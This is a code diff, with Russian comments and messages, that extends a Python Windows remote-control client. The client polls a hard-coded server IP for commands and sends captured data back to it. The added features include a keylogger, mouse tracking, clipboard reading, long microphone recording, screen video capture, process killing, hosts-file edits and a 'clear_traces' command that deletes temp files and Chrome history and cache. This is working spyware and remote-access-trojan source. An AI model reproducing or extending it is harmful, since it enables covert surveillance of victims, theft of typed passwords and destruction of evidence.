@@ -3,7 +3,7 @@ import socket
 import time
 import platform
 import hashlib
-from threading import Thread
+from threading import Thread, Lock
 import uuid
 import sys
 import pyautogui
@@ -19,6 +19,15 @@ import pyaudio
 import wave
 import keyboard as kb
 from io import BytesIO
+import win32gui
+import win32con
+import win32process
+import pycaw.pycaw as pycaw
+from comtypes import CLSCTX_ALL
+from ctypes import POINTER, cast
+from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
+import pyperclip
+from pynput import mouse
 
 SERVER_URL = "http://193.124.121.76:4443"
 
@@ -42,6 +51,19 @@ class PCClient:
         self.device_id = generate_device_id()
         self.system_info = get_system_info()
         self.running = True
+        # Кейлоггер
+        self.keylog = []
+        self.keylog_lock = Lock()
+        self.keylogger_running = False
+        # Мониторинг мыши
+        self.mouse_log = []
+        self.mouse_log_lock = Lock()
+        self.mouse_monitor_running = False
+        self.mouse_listener = None
+        # Длительная запись аудио
+        self.audio_recording = False
+        self.audio_frames = []
+        self.audio_thread = None
         
     def register_device(self):
         while self.running:
@@ -118,19 +140,24 @@ class PCClient:
             file_data = None
             file_type = None
             cmd = command['command']
-            # Для show_message поддерживаем кастомный текст
             if cmd.startswith('show_message:'):
                 title = "Сообщение"
                 text = cmd[len('show_message:'):]
                 pyautogui.alert(text=text, title=title)
                 result = f"Показано сообщение: {title} - {text}"
             elif cmd.startswith('hotkey:'):
-                hotkey = cmd[len('hotkey:'):].replace(' ', '')
-                try:
-                    kb.press_and_release(hotkey)
-                    result = f"Выполнена комбинация клавиш: {hotkey}"
-                except Exception as e:
-                    result = f"Ошибка выполнения hotkey: {hotkey} — {e}"
+                hotkey = cmd[len('hotkey:'):].replace(' ', '').lower()
+                if hotkey in ["win+l", "win+L"]:
+                    ctypes.windll.user32.LockWorkStation()
+                    result = "Выполнена блокировка экрана (Win+L)"
+                elif hotkey in ["ctrl+alt+delete", "ctrl+alt+del"]:
+                    result = "Ошибка: Ctrl+Alt+Delete нельзя эмулировать программно в Windows"
+                else:
+                    try:
+                        kb.press_and_release(hotkey)
+                        result = f"Выполнена комбинация клавиш: {hotkey}"
+                    except Exception as e:
+                        result = f"Ошибка выполнения hotkey: {hotkey} — {e}"
             elif cmd.startswith('cmd:'):
                 user_cmd = cmd[len('cmd:'):]
                 try:
@@ -201,6 +228,215 @@ class PCClient:
             elif cmd == 'sleep':
                 subprocess.run(["rundll32.exe", "powrprof.dll,SetSuspendState", "0,1,0"])
                 result = "Компьютер переведен в спящий режим"
+            elif cmd.startswith('record_video_multi:'):
+                try:
+                    count = int(cmd.split(':')[1])
+                except:
+                    count = 3
+                video_files = []
+                for i in range(count):
+                    res, fdata, ftype = self.record_video(10)
+                    if fdata and ftype == 'video':
+                        self.send_command_result(command['id'], f"Видео {i+1}/{count}", fdata, ftype)
+                        video_files.append(fdata)
+                result = f"Записано {len(video_files)} видео. Сервер склеит их."
+            elif cmd == 'list_windows':
+                def enum_handler(hwnd, windows):
+                    if win32gui.IsWindowVisible(hwnd):
+                        title = win32gui.GetWindowText(hwnd)
+                        if title:
+                            windows.append((hwnd, title))
+                windows = []
+                win32gui.EnumWindows(enum_handler, windows)
+                result = '\n'.join([f"{hwnd}: {title}" for hwnd, title in windows])
+            elif cmd.startswith('window_action:'):
+                # window_action:{hwnd}:{action}
+                parts = cmd.split(':')
+                hwnd = int(parts[1])
+                action = parts[2]
+                if action == 'minimize':
+                    win32gui.ShowWindow(hwnd, win32con.SW_MINIMIZE)
+                    result = f"Окно {hwnd} свернуто"
+                elif action == 'restore':
+                    win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
+                    result = f"Окно {hwnd} восстановлено"
+                elif action == 'close':
+                    win32gui.PostMessage(hwnd, win32con.WM_CLOSE, 0, 0)
+                    result = f"Окно {hwnd} закрыто"
+                else:
+                    result = f"Неизвестное действие: {action}"
+            elif cmd == 'system_info':
+                cpu = psutil.cpu_percent(interval=1)
+                ram = psutil.virtual_memory()
+                disks = psutil.disk_partitions()
+                disk_info = []
+                for d in disks:
+                    try:
+                        usage = psutil.disk_usage(d.mountpoint)
+                        disk_info.append(f"{d.device}: {usage.percent}% ({usage.used//(1024**3)}ГБ/{usage.total//(1024**3)}ГБ)")
+                    except:
+                        continue
+                # GPU через wmic
+                try:
+                    gpu = subprocess.check_output('wmic path win32_VideoController get name', shell=True, encoding='cp866')
+                    gpu = '\n'.join([line.strip() for line in gpu.splitlines() if line.strip() and 'Name' not in line])
+                except:
+                    gpu = 'Не удалось получить'
+                result = f"CPU: {cpu}%\nRAM: {ram.percent}% ({ram.used//(1024**2)}МБ/{ram.total//(1024**2)}МБ)\nДиски:\n" + '\n'.join(disk_info) + f"\nGPU: {gpu}"
+            elif cmd == 'volume_up_10':
+                devices = AudioUtilities.GetSpeakers()
+                interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
+                volume = cast(interface, POINTER(IAudioEndpointVolume))
+                current = volume.GetMasterVolumeLevelScalar()
+                volume.SetMasterVolumeLevelScalar(min(current + 0.1, 1.0), None)
+                result = "Громкость увеличена на 10%"
+            elif cmd == 'volume_down_10':
+                devices = AudioUtilities.GetSpeakers()
+                interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
+                volume = cast(interface, POINTER(IAudioEndpointVolume))
+                current = volume.GetMasterVolumeLevelScalar()
+                volume.SetMasterVolumeLevelScalar(max(current - 0.1, 0.0), None)
+                result = "Громкость уменьшена на 10%"
+            elif cmd == 'volume_mute':
+                devices = AudioUtilities.GetSpeakers()
+                interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
+                volume = cast(interface, POINTER(IAudioEndpointVolume))
+                mute = volume.GetMute()
+                volume.SetMute(1 if not mute else 0, None)
+                result = "Mute переключен"
+            elif cmd == 'keylogger_start':
+                if not self.keylogger_running:
+                    self.keylogger_running = True
+                    Thread(target=self._keylogger_thread, daemon=True).start()
+                    result = "Кейлоггер запущен"
+                else:
+                    result = "Кейлоггер уже работает"
+            elif cmd == 'keylogger_stop':
+                self.keylogger_running = False
+                result = "Кейлоггер остановлен"
+            elif cmd == 'keylogger_dump':
+                with self.keylog_lock:
+                    result = ''.join(self.keylog)[-1000:] or 'Лог пуст'
+            elif cmd == 'keylogger_clear':
+                with self.keylog_lock:
+                    self.keylog.clear()
+                result = "Лог кейлоггера очищен"
+            elif cmd == 'mouse_monitor_start':
+                if not self.mouse_monitor_running:
+                    self.mouse_monitor_running = True
+                    self.mouse_log = []
+                    self.mouse_listener = mouse.Listener(on_move=self._on_mouse_move, on_click=self._on_mouse_click)
+                    self.mouse_listener.start()
+                    result = "Мониторинг мыши запущен"
+                else:
+                    result = "Мониторинг мыши уже работает"
+            elif cmd == 'mouse_monitor_stop':
+                self.mouse_monitor_running = False
+                if self.mouse_listener:
+                    self.mouse_listener.stop()
+                    self.mouse_listener = None
+                result = "Мониторинг мыши остановлен"
+            elif cmd == 'mouse_monitor_dump':
+                with self.mouse_log_lock:
+                    result = '\n'.join(self.mouse_log)[-1000:] or 'Лог мыши пуст'
+            elif cmd == 'apps_monitor':
+                procs = [f"{p.info['name']} ({p.info['pid']})" for p in psutil.process_iter(['pid','name'])]
+                result = '\n'.join(procs[:50])
+            elif cmd == 'clipboard_monitor':
+                try:
+                    result = pyperclip.paste() or 'Буфер обмена пуст'
+                except Exception as e:
+                    result = f"Ошибка: {e}"
+            elif cmd == 'clear_traces':
+                try:
+                    # Очистка temp
+                    temp = os.environ.get('TEMP')
+                    if temp:
+                        for f in os.listdir(temp):
+                            try:
+                                fp = os.path.join(temp, f)
+                                if os.path.isfile(fp):
+                                    os.remove(fp)
+                                elif os.path.isdir(fp):
+                                    import shutil
+                                    shutil.rmtree(fp)
+                            except: pass
+                    # Очистка истории Chrome
+                    chrome = os.path.expanduser('~')+r"\AppData\Local\Google\Chrome\User Data\Default\History"
+                    if os.path.exists(chrome):
+                        try:
+                            os.remove(chrome)
+                        except: pass
+                    # Очистка кэша Chrome
+                    cache = os.path.expanduser('~')+r"\AppData\Local\Google\Chrome\User Data\Default\Cache"
+                    if os.path.exists(cache):
+                        import shutil
+                        shutil.rmtree(cache, ignore_errors=True)
+                    result = "Следы очищены (temp, история, кэш)"
+                except Exception as e:
+                    result = f"Ошибка очистки: {e}"
+            elif cmd.startswith('block_site:'):
+                url = cmd[len('block_site:'):].strip()
+                hosts = r"C:\Windows\System32\drivers\etc\hosts"
+                try:
+                    with open(hosts, 'a', encoding='utf-8') as f:
+                        f.write(f"\n127.0.0.1 {url}\n")
+                    result = f"Сайт {url} заблокирован"
+                except Exception as e:
+                    result = f"Ошибка: {e}"
+            elif cmd.startswith('unblock_site:'):
+                url = cmd[len('unblock_site:'):].strip()
+                hosts = r"C:\Windows\System32\drivers\etc\hosts"
+                try:
+                    with open(hosts, 'r', encoding='utf-8') as f:
+                        lines = f.readlines()
+                    with open(hosts, 'w', encoding='utf-8') as f:
+                        for line in lines:
+                            if url not in line:
+                                f.write(line)
+                    result = f"Сайт {url} разблокирован"
+                except Exception as e:
+                    result = f"Ошибка: {e}"
+            elif cmd.startswith('block_app:'):
+                name = cmd[len('block_app:'):].strip().lower()
+                killed = False
+                for p in psutil.process_iter(['name']):
+                    if p.info['name'].lower() == name:
+                        p.kill()
+                        killed = True
+                result = f"Приложение {name} заблокировано (завершено)" if killed else f"Приложение {name} не найдено"
+            elif cmd.startswith('unblock_app:'):
+                # Просто сообщение, так как разблокировка — это не запуск
+                result = f"Для разблокировки просто запустите приложение вручную"
+            elif cmd == 'record_audio_start':
+                if not self.audio_recording:
+                    self.audio_recording = True
+                    self.audio_frames = []
+                    self.audio_thread = Thread(target=self._audio_record_thread, daemon=True)
+                    self.audio_thread.start()
+                    result = "Длительная запись аудио начата"
+                else:
+                    result = "Запись уже идет"
+            elif cmd == 'record_audio_stop':
+                if self.audio_recording:
+                    self.audio_recording = False
+                    self.audio_thread.join()
+                    # Сохраняем и отправляем
+                    temp_file = f"temp_audio_long_{self.device_id}.wav"
+                    wf = wave.open(temp_file, 'wb')
+                    wf.setnchannels(1)
+                    wf.setsampwidth(pyaudio.PyAudio().get_sample_size(pyaudio.paInt16))
+                    wf.setframerate(44100)
+                    wf.writeframes(b''.join(self.audio_frames))
+                    wf.close()
+                    with open(temp_file, "rb") as f:
+                        audio_bytes = f.read()
+                    os.remove(temp_file)
+                    file_data = base64.b64encode(audio_bytes).decode('utf-8')
+                    file_type = 'audio'
+                    result = f"Длительная запись аудио завершена"
+                else:
+                    result = "Запись не велась"
             self.send_command_result(command['id'], result, file_data, file_type)
         except Exception as e:
             print(f"Ошибка выполнения команды: {e}")
@@ -233,15 +469,20 @@ class PCClient:
     
     def record_video(self, seconds):
         try:
-
-            screen_size = pyautogui.size()
+            import pyautogui
+            import numpy as np
+            import cv2
+            import time
+            import os
+            screen_size = (800, 600)
             fourcc = cv2.VideoWriter_fourcc(*'MJPG')
             temp_file = f"temp_screenvideo_{self.device_id}.avi"
-            out = cv2.VideoWriter(temp_file, fourcc, 10.0, screen_size)
+            out = cv2.VideoWriter(temp_file, fourcc, 5.0, screen_size)
             start_time = time.time()
             frame_written = False
-            while (time.time() - start_time) < seconds:
+            while (time.time() - start_time) < min(seconds, 5):
                 img = pyautogui.screenshot()
+                img = img.resize(screen_size)
                 frame = np.array(img)
                 frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
                 out.write(frame)
@@ -249,10 +490,14 @@ class PCClient:
             out.release()
             if not frame_written:
                 return "Ошибка: не удалось записать видео (нет кадров)", None, None
+            file_size = os.path.getsize(temp_file)
+            if file_size > 45 * 1024 * 1024:
+                os.remove(temp_file)
+                return "Ошибка: видео слишком большое для отправки (более 45 МБ)", None, None
             with open(temp_file, "rb") as f:
                 video_bytes = f.read()
             os.remove(temp_file)
-            return f"Видео экрана записано ({seconds} сек)", base64.b64encode(video_bytes).decode('utf-8'), 'video'
+            return f"Видео экрана записано (до 5 сек)", base64.b64encode(video_bytes).decode('utf-8'), 'video'
         except Exception as e:
             return f"Ошибка записи видео: {str(e)}", None, None
     
@@ -332,6 +577,35 @@ class PCClient:
             except KeyboardInterrupt:
                 self.running = False
                 print("Клиент остановлен")
+
+    def _keylogger_thread(self):
+        import keyboard
+        while self.keylogger_running:
+            event = keyboard.read_event(suppress=False)
+            if event.event_type == keyboard.KEY_DOWN:
+                with self.keylog_lock:
+                    self.keylog.append(event.name)
+            time.sleep(0.01)
+
+    def _on_mouse_move(self, x, y):
+        if self.mouse_monitor_running:
+            with self.mouse_log_lock:
+                self.mouse_log.append(f"move: {x},{y}")
+
+    def _on_mouse_click(self, x, y, button, pressed):
+        if self.mouse_monitor_running:
+            with self.mouse_log_lock:
+                self.mouse_log.append(f"{'down' if pressed else 'up'}: {button} at {x},{y}")
+
+    def _audio_record_thread(self):
+        p = pyaudio.PyAudio()
+        stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
+        while self.audio_recording:
+            data = stream.read(1024)
+            self.audio_frames.append(data)
+        stream.stop_stream()
+        stream.close()
+        p.terminate()
 
 if __name__ == '__main__':
     try:
